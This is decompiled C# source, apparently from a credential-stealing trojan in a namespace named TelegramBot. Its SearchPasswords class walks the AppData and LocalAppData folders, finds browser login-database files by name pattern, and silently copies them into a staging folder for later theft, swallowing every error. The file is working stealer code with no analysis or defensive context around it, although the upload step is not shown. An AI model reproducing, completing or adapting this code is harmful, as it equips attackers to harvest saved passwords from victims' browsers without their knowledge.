using System;
using System.Collections.Generic;
using System.IO;
using System.Security;

namespace TelegramBot
{
	// Token: 0x020000EF RID: 239
	public class SearchPasswords
	{
		// Token: 0x1700001C RID: 28
		// (get) Token: 0x0600032B RID: 811 RVA: 0x00003213 File Offset: 0x00001413
		private static int GetScount
		{
			get
			{
				return SearchPasswords.Fragment++;
			}
		}

		// Token: 0x0600032C RID: 812 RVA: 0x00025DC4 File Offset: 0x00023FC4
		public static void CheckList(string Logins)
		{
			List<string> list = new List<string>();
			foreach (string path in SearchPasswords.BrPaths)
			{
				try
				{
					list.AddRange(Directory.EnumerateDirectories(path));
				}
				catch
				{
				}
			}
			foreach (string path2 in list)
			{
				try
				{
					SearchPasswords.Browsers.AddRange(Directory.EnumerateFiles(path2, Logins, SearchOption.AllDirectories));
				}
				catch
				{
				}
			}
		}

		// Token: 0x0600032D RID: 813 RVA: 0x00025E8C File Offset: 0x0002408C
		private static void GetSecureFile(string PathLogins, string Pattern, SearchOption SO = SearchOption.TopDirectoryOnly)
		{
			try
			{
				foreach (string text in Directory.EnumerateFiles(PathLogins, Pattern, SO))
				{
					if (File.Exists(text))
					{
						SearchPasswords.GetLogins.Add(text);
					}
				}
			}
			catch (UnauthorizedAccessException)
			{
			}
			catch (IOException)
			{
			}
			catch (SecurityException)
			{
			}
		}

		// Token: 0x0600032E RID: 814 RVA: 0x00025F18 File Offset: 0x00024118
		public static void CopyLoginsInSafeDir(string Folder, bool Recursive = true)
		{
			try
			{
				Directory.CreateDirectory(Path.Combine(HomePath.User_Name, Folder));
			}
			catch
			{
			}
			for (int i = 0; i < SearchPasswords.Browsers.Count; i++)
			{
				if (File.Exists(SearchPasswords.Browsers[i]))
				{
					try
					{
						File.Copy(SearchPasswords.Browsers[i], Path.Combine(Path.Combine(HomePath.User_Name, Folder), Path.GetFileName(string.Format("{0}{1}", SearchPasswords.Browsers[i], SearchPasswords.GetScount))), Recursive);
					}
					catch
					{
					}
				}
			}
			SearchPasswords.GetSecureFile(Path.Combine(HomePath.User_Name, "Logins"), "*", SearchOption.TopDirectoryOnly);
		}

		// Token: 0x04000552 RID: 1362
		private static int Fragment = 1;

		// Token: 0x04000553 RID: 1363
		private static List<string> Browsers = new List<string>();

		// Token: 0x04000554 RID: 1364
		public static List<string> GetLogins = new List<string>();

		// Token: 0x04000555 RID: 1365
		private static readonly List<string> BrPaths = new List<string>
		{
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
			Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
		};
	}
}
